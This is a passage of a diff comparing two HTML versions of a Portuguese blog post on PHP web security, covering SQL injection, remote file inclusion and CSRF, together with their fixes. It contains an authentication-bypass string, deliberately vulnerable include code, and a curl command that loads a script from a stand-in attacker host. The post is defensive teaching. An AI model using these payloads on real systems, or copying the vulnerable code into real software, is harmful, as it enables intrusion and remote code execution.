-</pre></div> <p>Com o <strong>mysqli</strong>, precisamos fazer algumas alterações no código, como demonstrado abaixo:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
-<span class=c1># sql-injection.php (com mysqli)</span>
+Login com sucesso</code></pre></div>
+<p>A nossa <em>query</em>, por não fazermos um tratamento nos campos do
+formulário, foi composta pelo valor <code class="language-text">bar’ OR &#39;1’ = ’1</code>, o que resultou
+no seguinte <em>SQL</em>:</p>
+<div class="gatsby-highlight" data-language="sql"><pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token number">1</span> <span class="token keyword">FROM</span> usuario
+<span class="token keyword">WHERE</span> usuario <span class="token operator">=</span> <span class="token string">'foo'</span> <span class="token operator">AND</span> senha <span class="token operator">=</span> <span class="token string">'bar'</span> <span class="token operator">OR</span> <span class="token string">'1'</span> <span class="token operator">=</span> <span class="token string">'1'</span></code></pre></div>
+<p>Existem algumas soluções para este problema, como o uso de
+<code class="language-text">addslashes</code> no <em>PHP</em>, mas os que fazem mais sentido para mim são:</p>
+<ul>
+<li>O uso da função <code class="language-text">mysql_real_escape_string</code> para formatar dados
+antes de construir a <em>query</em>;</li>
+<li>O uso da classe <code class="language-text">mysqli</code> para consultas a bancos de dados <em>MySQL</em>,
+ao invés do uso das funções <em>mysql</em>.</li>
+</ul>
+<p>A primeira é a mais prática de aplicarmos. No código anterior, bastaria
+formatar os valores na hora que são resgatados do <em>array</em> <code class="language-text">$_POST</code>:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token variable">$usuario</span>    <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'usuario'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$senha</span>      <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'senha'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
+<p>Com o <strong>mysqli</strong>, precisamos fazer algumas alterações no código, como
+demonstrado abaixo:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token shell-comment comment"># sql-injection.php (com mysqli)</span>
 
-<span class=k>if</span> <span class=p>(</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>]))</span> <span class=p>{</span>
-    <span class=nv>$usuario</span>    <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>];</span>
-    <span class=nv>$senha</span>      <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>];</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'usuario'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'senha'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$usuario</span>    <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'usuario'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$senha</span>      <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'senha'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-    <span class=c1>// Abre conexão com o banco de dados</span>
-    <span class=nv>$mysqli</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;exemplos_blog&#39;</span><span class=p>);</span>
-    <span class=c1>// Faz a consulta ao banco, comparando usuário e senha</span>
-    <span class=nv>$query</span> <span class=o>=</span> <span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s2>&quot;SELECT 1 FROM usuario WHERE usuario = ? &quot;</span>
-        <span class=o>.</span> <span class=s2>&quot;AND senha = ?&quot;</span><span class=p>);</span>
-    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;ss&#39;</span><span class=p>,</span> <span class=nv>$usuario</span><span class=p>,</span> <span class=nv>$senha</span><span class=p>);</span>
-    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
-    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>store_result</span><span class=p>();</span>
+        <span class="token comment">// Abre conexão com o banco de dados</span>
+        <span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'exemplos_blog'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// Faz a consulta ao banco, comparando usuário e senha</span>
+        <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT 1 FROM usuario WHERE usuario = ? "</span>
+            <span class="token punctuation">.</span> <span class="token double-quoted-string string">"AND senha = ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ss'</span><span class="token punctuation">,</span> <span class="token variable">$usuario</span><span class="token punctuation">,</span> <span class="token variable">$senha</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class=nv>$num_rows</span> <span class=o>=</span> <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>;</span>
+        <span class="token variable">$num_rows</span> <span class="token operator">=</span> <span class="token variable">$query</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>
 
-    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
+        <span class="token variable">$query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class=k>if</span> <span class=p>(</span><span class=nv>$num_rows</span><span class=p>)</span> <span class=p>{</span>
-        <span class=c1>// Vai para a página logada</span>
-        <span class=k>echo</span> <span class=s1>&#39;Login com sucesso&#39;</span><span class=p>;</span>
-    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-        <span class=c1>// Errou o usuário e senha, volta para a página de login</span>
-        <span class=k>echo</span> <span class=s1>&#39;Usuário e senha inválidos&#39;</span><span class=p>;</span>
-    <span class=p>}</span>
-<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-    <span class=c1>// Vai para a página de login</span>
-<span class=p>}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment">// Vai para a página logada</span>
+            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Login com sucesso'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token comment">// Errou o usuário e senha, volta para a página de login</span>
+            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Usuário e senha inválidos'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token comment">// Vai para a página de login</span>
+    <span class="token punctuation">}</span>
+<span class="token delimiter important">?></span></span></code></pre></div>
+<p>Mas como o mundo não é feito só de <em>MySQL</em>, se ocorrer de você utilizar
+um outro banco de dados, eu recomendo o uso da biblioteca <a href="http://php.net/pdo" title="Conheça a lib PDO do PHP"><em>PDO</em></a>.</p>
+<p>Como o <a href="https://docs.djangoproject.com/en/1.4/topics/db/queries/" title="Making queries"><em>Django</em> utiliza <em>ORM</em></a>, e o <a href="http://codeigniter.com/user_guide/database/active_record.html" title="Active Record Class"><em>Codeigniter</em> tem a <em>Active
+Record Class</em></a>, nesses <em>frameworks</em> essa validação é feita no momento
+que interagimos com os seus <em>models</em>. Mas é sempre bom ter cuidado!
+Principalmente quando o <em>ORM</em> não atende o nosso requisito, e temos que
+partir para consultas <em>SQL</em> puras.</p>
+<h3>Senhas criptografadas</h3>
+<p>Uma boa dica é, sempre que persistirmos um usuário em nossa base de
+dados, armazenarmos a sua senha criptografada em um formato “sem volta”
+(conhecido como <em>hash</em>). Além de ser um princípio ético, que na minha
+opinião todo o desenvolver de aplicações deveria ter, garantimos que
+mesmo que a nossa aplicação seja invadida, as senhas dos usuários
+estarão “seguras”.</p>
+<p>Embora o <a href="http://pt.wikipedia.org/wiki/MD5" title="Conheça o algoritmo MD5"><em>MD5</em></a> e o <a href="http://pt.wikipedia.org/wiki/SHA1" title="Conheça o algoritmo SHA1"><em>SHA1</em></a> sejam as escolhas mais populares, os
+desenvolvedores do <em>Django</em> <a href="https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing" title="Leia a release note do Django 1.4">recomendam o uso de algoritmos mais sofisticados</a>,
+como o <a href="http://en.wikipedia.org/wiki/PBKDF2" title="Conheça o algoritmo PBKDF2"><em>PBKDF2</em></a>, por acreditarem que o poder
+computacional atingiu um nível, que senhas <em>MD5</em> e <em>SHA1</em> podem com
+considerável esforço ser quebradas.</p>
+<h2>PHP Injection (não confie no PHP)</h2>
+<p>Embora esta técnica possa acontecer em outras linguagens, o <em>PHP</em> dá
+muita margem para desenvolvedores menos experientes deixarem brechas
+para uma vulnerabilidade conhecida como <strong><em>PHP
+Injection</em></strong>.</p>
+<p>Com o site dividido em seções, é comum termos inclusões de arquivos
+<em>PHP</em> para compor uma página. Para economizar esforço e linhas de
+código, deixamos as partes como menu e topo “estáticas”, e só alteramos
+o conteúdo do bloco principal da página. Acontece que em alguns casos, o
+desenvolvedor espera que um determinado arquivo seja importado de acordo
+com a <em>URL</em> que o internauta está visitando. Por exemplo:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token shell-comment comment"># php-injection.php</span>
 
-<span class=cp>?&gt;</span><span class=x></span>
-</pre></div> <p>Mas como o mundo não é feito só de <em>MySQL</em>, se ocorrer de você utilizar um outro banco de dados, eu recomendo o uso da biblioteca <a href=http://php.net/pdo title="Conheça a lib PDO do PHP"><em>PDO</em></a>.</p> <p>Como o <a href=https://docs.djangoproject.com/en/1.4/topics/db/queries/ title="Making queries"><em>Django</em> utiliza <em>ORM</em></a>, e o <a href=http://codeigniter.com/user_guide/database/active_record.html title="Active Record Class"><em>Codeigniter</em> tem a <em>Active Record Class</em></a>, nesses <em>frameworks</em> essa validação é feita no momento que interagimos com os seus <em>models</em>. Mas é sempre bom ter cuidado! Principalmente quando o <em>ORM</em> não atende o nosso requisito, e temos que partir para consultas <em>SQL</em> puras.</p> <h3>Senhas criptografadas</h3> <p>Uma boa dica é, sempre que persistirmos um usuário em nossa base de dados, armazenarmos a sua senha criptografada em um formato “sem volta” (conhecido como <em>hash</em>). Além de ser um princípio ético, que na minha opinião todo o desenvolver de aplicações deveria ter, garantimos que mesmo que a nossa aplicação seja invadida, as senhas dos usuários estarão “seguras”.</p> <p>Embora o <a href=http://pt.wikipedia.org/wiki/MD5 title="Conheça o algoritmo MD5"><em>MD5</em></a> e o <a href=http://pt.wikipedia.org/wiki/SHA1 title="Conheça o algoritmo SHA1"><em>SHA1</em></a> sejam as escolhas mais populares, os desenvolvedores do <em>Django</em> <a href=https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing title="Leia a release note do Django 1.4">recomendam o uso de algoritmos mais sofisticados</a>, como o <a href=http://en.wikipedia.org/wiki/PBKDF2 title="Conheça o algoritmo PBKDF2"><em>PBKDF2</em></a>, por acreditarem que o poder computacional atingiu um nível, que senhas <em>MD5</em> e <em>SHA1</em> podem com considerável esforço ser quebradas.</p> <h2>PHP Injection (não confie no PHP)</h2> <p>Embora esta técnica possa acontecer em outras linguagens, o <em>PHP</em> dá muita margem para desenvolvedores menos experientes deixarem brechas para uma vulnerabilidade conhecida como <strong><em>PHP Injection</em></strong>.</p> <p>Com o site dividido em seções, é comum termos inclusões de arquivos <em>PHP</em> para compor uma página. Para economizar esforço e linhas de código, deixamos as partes como menu e topo “estáticas”, e só alteramos o conteúdo do bloco principal da página. Acontece que em alguns casos, o desenvolvedor espera que um determinado arquivo seja importado de acordo com a <em>URL</em> que o internauta está visitando. Por exemplo:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
-<span class=c1># php-injection.php</span>
+<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-<span class=nv>$page</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>];</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'topo.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'menu.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class=k>include</span><span class=p>(</span><span class=s1>&#39;topo.php&#39;</span><span class=p>);</span>
-<span class=k>include</span><span class=p>(</span><span class=s1>&#39;menu.php&#39;</span><span class=p>);</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class=k>include</span><span class=p>(</span><span class=nv>$page</span><span class=p>);</span>
-
-<span class=cp>?&gt;</span><span class=x></span>
-</pre></div> <p>Logo:</p> <div class=highlight><pre><span></span>$ curl http://localhost/php-injection.php?page<span class=o>=</span>novidades.php
-</pre></div> <p>No caso acima, estamos incluindo o arquivo <code>novidades.php</code> e automaticamente exibindo o seu conteúdo. Podemos navegar por outras áreas do <em>website</em>, por exemplo, <code>page=contato.php</code> ou <code>page=institucional.php</code>. Mas, e se informarmos <code>page=php-injection.php</code>?</p> <p>Caímos num <em>looping</em> infinito!</p> <p>E, infelizmente, esse é o menor dos nossos problemas. O <em>PHP</em>, quando configurado com a opção <code>allow_url_include</code> como <code>TRUE</code>, é capaz de importar arquivos de outros <em>hosts</em>. Logo, o atacante pode ter um <em>script</em> malicioso hospedado em seu servidor, e passar o caminho dele para a aplicação acima. A aplicação incluirá e interpretará o <em>PHP</em> que estiver neste <em>script</em>:</p> <div class=highlight><pre><span></span>$ curl http://localhost/php-injection.php?page<span class=o>=</span>http://sitedoatacante.com.br/meu-script-malicioso.php.txt
-</pre></div> <p>Pronto! Temos código <em>PHP</em> de outra pessoa executando em nosso servidor.</p> <p>Para resolver este problema, configure a opção <code>allow_url_include</code> em seu <code>php.ini</code> como <code>FALSE</code>. Outro passo importante é, sempre que for importar algum arquivo que dependa de informações vindas do usuário, verifique o conteúdo desta informação. Exemplo:</p> <div class=highlight><pre><span></span><span class=x>switch($page) {</span>
-<span class=x>    case &#39;novidades&#39;:</span>
-<span class=x>        include(&#39;novidades.php&#39;);</span>
-<span class=x>        break;</span>
-<span class=x>    case &#39;contato&#39;:</span>
-<span class=x>        include(&#39;contato.php&#39;);</span>
-<span class=x>        break;</span>
-<span class=x>    case &#39;institucional&#39;:</span>
-<span class=x>        include(&#39;institucional.php&#39;);</span>
-<span class=x>        break;</span>
-<span class=x>    default:</span>
-<span class=x>        include(&#39;404.php&#39;);</span>
-<span class=x>}</span>
-</pre></div> <p>Este ataque não é tão incomum quanto deveria. Fique atento.</p> <h2>CSRF – Cross-site request forgery (não confie na requisição)</h2> <p>O <strong><em>Cross-site request forgery</em></strong> ou <strong>falsificação de solicitação entre sites</strong>, é uma forma de ataque que mescla a <a href=http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o) title="Leia mais sobre Engenharia Social no Wikipedia">Engenharia Social</a> com vulnerabilidades das aplicações <em>web</em>.</p> <p>O ataque pode ser feito da seguinte forma:</p> <ul> <li>Você recebe um <em>e-mail</em> com uma <em>URL</em> oculta (geralmente algum <em>e-mail</em> do tipo “Veja as minhas fotos” (: )</li> <li>Esta <em>URL</em> executa alguma ação em uma aplicação que você esteja autenticado no momento (por exemplo, o <em>Facebook</em>)</li> <li>Esta ação pode, tanto dar poderes de acesso ao atacante, quanto alterar ou remover os seus dados permanentemente</li> </ul> <p>Note que o primeiro item pode ser substituído por algum <strong>conteúdo <em>link</em> injetado via <em>XSS</em></strong> em algum fórum ou área de comentários de um <em>blog</em>.</p> <p>Embora o exemplo acima não represente tanta ameaça, existem vários tipos de aplicações que este tipo de técnica pode afetar. O exemplo do banco, encontrado no <em>site</em> <a href=https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) title="Leia mais sobre CSRF"><em>The Open Web Application Security Project</em></a>, é um excelente exempo de ataque <em>CSRF</em>.</p> <p>Para prevenir este tipo de problema, podemos fazer um controle através de <a href=https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html title="Entendendo o Cookies e Sessões">sessões</a> e transmitir um <em>token</em> que identifique que a requisição foi de fato feita pelo usuário. <em>Kinn Coelho Julião</em> escreveu <a href=http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/ title="Protegendo seus sistemas contra ataques CSRF">um <em>post</em> interessante para o <em>PHP-SP</em></a>, demonstrando como prevenir ataques <em>CSRF</em> através de <em>token</em>.</p> <p>De fato, tanto o <em>Django</em> quanto o <em>Codeigniter</em> utilizam essa tática para prevenir ataques <em>CSRF</em>. No <em>Django</em>, com o <em>middleware</em> <code>django.middleware.csrf.CsrfViewMiddleware</code>, basta adicionar a chamada da <em>templatetag</em> ao formulário:</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&quot;post&quot;</span> <span class=na>action</span><span class=o>=</span><span class=s>&quot;.&quot;</span><span class=p>&gt;</span>
+<span class="token delimiter important">?></span></span></code></pre></div>
+<p>Logo:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ curl http://localhost/php-injection.php?page=novidades.php</code></pre></div>
+<p>No caso acima, estamos incluindo o arquivo <code class="language-text">novidades.php</code> e
+automaticamente exibindo o seu conteúdo. Podemos navegar por outras
+áreas do <em>website</em>, por exemplo, <code class="language-text">page=contato.php</code> ou
+<code class="language-text">page=institucional.php</code>. Mas, e se informarmos
+<code class="language-text">page=php-injection.php</code>?</p>
+<p>Caímos num <em>looping</em> infinito!</p>
+<p>E, infelizmente, esse é o menor dos nossos problemas. O <em>PHP</em>, quando
+configurado com a opção <code class="language-text">allow_url_include</code> como <code class="language-text">TRUE</code>, é capaz
+de importar arquivos de outros <em>hosts</em>. Logo, o atacante pode ter um
+<em>script</em> malicioso hospedado em seu servidor, e passar o caminho dele
+para a aplicação acima. A aplicação incluirá e interpretará o <em>PHP</em> que
+estiver neste <em>script</em>:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt</code></pre></div>
+<p>Pronto! Temos código <em>PHP</em> de outra pessoa executando em nosso servidor.</p>
+<p>Para resolver este problema, configure a opção <code class="language-text">allow_url_include</code>
+em seu <code class="language-text">php.ini</code> como <code class="language-text">FALSE</code>. Outro passo importante é, sempre que
+for importar algum arquivo que dependa de informações vindas do usuário,
+verifique o conteúdo desta informação. Exemplo:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">case</span> <span class="token single-quoted-string string">'novidades'</span><span class="token punctuation">:</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'novidades.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token single-quoted-string string">'contato'</span><span class="token punctuation">:</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'contato.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token single-quoted-string string">'institucional'</span><span class="token punctuation">:</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'institucional.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">default</span><span class="token punctuation">:</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre></div>
+<p>Este ataque não é tão incomum quanto deveria. Fique atento.</p>
+<h2>CSRF – Cross-site request forgery (não confie na requisição)</h2>
+<p>O <strong><em>Cross-site request forgery</em></strong> ou <strong>falsificação de solicitação
+entre sites</strong>, é uma forma de ataque que mescla a <a href="http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o)" title="Leia mais sobre Engenharia Social no Wikipedia">Engenharia Social</a>
+com vulnerabilidades das aplicações <em>web</em>.</p>
+<p>O ataque pode ser feito da seguinte forma:</p>
+<ul>
+<li>Você recebe um <em>e-mail</em> com uma <em>URL</em> oculta (geralmente algum
+<em>e-mail</em> do tipo “Veja as minhas fotos” (: )</li>
+<li>Esta <em>URL</em> executa alguma ação em uma aplicação que você esteja
+autenticado no momento (por exemplo, o <em>Facebook</em>)</li>
+<li>Esta ação pode, tanto dar poderes de acesso ao atacante, quanto
+alterar ou remover os seus dados permanentemente</li>
+</ul>
+<p>Note que o primeiro item pode ser substituído por algum <strong>conteúdo
+<em>link</em> injetado via <em>XSS</em></strong> em algum fórum ou área de comentários de um
+<em>blog</em>.</p>
+<p>Embora o exemplo acima não represente tanta ameaça, existem vários tipos
+de aplicações que este tipo de técnica pode afetar. O exemplo do banco,
+encontrado no <em>site</em> <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" title="Leia mais sobre CSRF"><em>The Open Web Application Security Project</em></a>, é
+um excelente exempo de ataque <em>CSRF</em>.</p>
+<p>Para prevenir este tipo de problema, podemos fazer um controle através
+de <a href="/2012/04/05/entendendo-os-cookies-e-sessoes.html" title="Entendendo o Cookies e Sessões">sessões</a> e transmitir um <em>token</em> que identifique que a requisição
+foi de fato feita pelo usuário. <em>Kinn Coelho Julião</em> escreveu <a href="http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/" title="Protegendo seus sistemas contra ataques CSRF">um <em>post</em> interessante para o <em>PHP-SP</em></a>,
+demonstrando como prevenir ataques <em>CSRF</em> através de <em>token</em>.</p>
+<p>De fato, tanto o <em>Django</em> quanto o <em>Codeigniter</em> utilizam essa tática
+para prevenir ataques <em>CSRF</em>. No <em>Django</em>, com o <em>middleware</em>
+<code class="language-text">django.middleware.csrf.CsrfViewMiddleware</code>, basta adicionar a chamada
+da <em>templatetag</em> ao formulário:</p>
+<div class="gatsby-highlight" data-language="django-html"><pre class="language-django-html"><code class="language-django-html">&lt;form method=&quot;post&quot; action=&quot;.&quot;&gt;
     {% csrf_token %}
     ...
-<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
-</pre></div> <p>A <em>templatetag</em> acima criará um campo oculto no formulário chamado <code>csrfmiddlewaretoken</code>. Quando um <em>POST</em> for realizado para a <em>view</em> em questão, caso o conteúdo de <code>csrfmiddlewaretoken</code> vindo do formulário não “bata” com o conteúdo armazenado em sessão, o <em>Django</em> entende que aquela requisição não foi feita de maneira “natural” (ou seja, acessando o formulário e submetendo-o). Logo, fica subentendido que aquela requisição veio de outra origem, e o <em>framework</em> não executa as instruções da <em>view</em> (retornando um código 403).</p> <p>No <em>Codeigniter</em>, com a opção <code>$config['csrf_protection’]</code> como <code>TRUE</code> no arquivo <code>application/config/config.php</code>, o <em>framework</em> adicionará automaticamente o campo de proteção <em>CSRF</em> na abertura do formulário:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span> <span class=nx>form_open</span><span class=p>();</span> <span class=cp>?&gt;</span><span class=x></span>
-</pre></div> <h2>Considerações finais</h2> <p>Ficou um <em>post</em> grande, mas acredito que consegui cobrir os problemas de segurança mais conhecidos em aplicações <em>Web</em>. Como é possível notar, são vulnerabilidades que são facilmente contornáveis, mas que podem trazer sérios problemas para você e seus usuários caso a sua aplicação não esteja segura o bastante.</p> <p>Reforço: Se você tiver a oportunidade de utilizar um <em>framework</em>, utilize! Eles possuem soluções prontas e bem testadas para prevenir os problemas citados acima, e outros tantos que surgem a cada dia na <em>internet</em>.</p> <h2>Referências</h2> <ul> <li><a href=http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/ title="As diferentes formas de validarmos um valor inteiro em PHP"><em>Caugh in a Web: Validating an integer in PHP</em></a></li> <li><a href=http://codeigniter.com/user_guide/database/active_record.html title="Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter"><em>Codeigniter User Guide: Active Record Class</em></a></li> <li><a href=http://codeigniter.com/user_guide/general/security.html title="Veja as dicas de segurança dadas pelo time do Codeigniter"><em>Codeigniter User Guide: Security</em></a></li> <li><a href=https://docs.djangoproject.com/en/1.4/topics/db/queries/ title="Saiba como construir modelos e como consultá-los através do ORM do Django"><em>Django Documentation: Making queries</em></a></li> <li><a href=https://docs.djangoproject.com/en/dev/topics/security/ title="Veja dicas preciosas de segurança utilizando o Django"><em>Django Documentation: Security in Django</em></a></li> <li><a href=http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/ title="Entenda como funciona um ataque via PHP Injection">Invasão.com.br: <em>PHP Injection</em> – O fim das dúvidas</a></li> <li><a href=http://www.php.net/manual/pt_BR/book.mysqli.php title="Conheça a mysqli direto da documentação do PHP"><em>PHP Documentation: MySQL Melhorada</em></a></li> <li><a href=http://php.net/pdo title="Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP"><em>PHP Documentation: PDO – PHP Data Objects</em></a></li> <li><a href=http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/ title="Aprenda como utilizar tolkens para prevenir ataques CSRF"><em>PHP SP</em>: Protegendo o seu sistema contra ataques <em>CSRF</em></a></li> <li><a href=http://www.sitepoint.com/php-security-blunders/ title="Excelentes dicas de segurança para quem programa em PHP"><em>Site Point: Top 7 PHP Security Blunders Article</em></a></li> <li><a href=http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php title="Excelente thread no Stack Overflow, sobre SQL injection"><em>Stack Overflow: Best way to stop SQL injection in PHP</em></a></li> <li><a href=https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) title="Um bom artigo sobre o conceito do CSRF"><em>The Open Web Application Security Project: Cross-Site Request Forgery</em></a></li> <li><a href=http://en.wikipedia.org/wiki/Code_injection title="Leia mais sobre as formas de injeção de código no Wikipedia"><em>Wikipedia: Code Injection</em></a></li> <li><a href=http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL title="Leia mais sobre SQL Injection no Wikipedia"><em>Wikipedia</em>: Injeção de <em>SQL</em></a></li> </ul> </div> </span> <div class=Article-tags> <span class=Article-tagLabel>Tags:</span> <span itemprop=keywords> <a href=https://klauslaube.com.br/tag/desenvolvimento.html title="Leia mais sobre" class=Article-tagLink>desenvolvimento</a> <a href=https://klauslaube.com.br/tag/web.html title="Leia mais sobre" class=Article-tagLink>web</a> <a href=https://klauslaube.com.br/tag/seguranca.html title="Leia mais sobre" class=Article-tagLink>segurança</a> <a href=https://klauslaube.com.br/tag/xss.html title="Leia mais sobre" class=Article-tagLink>xss</a> <a href=https://klauslaube.com.br/tag/csrf.html title="Leia mais sobre" 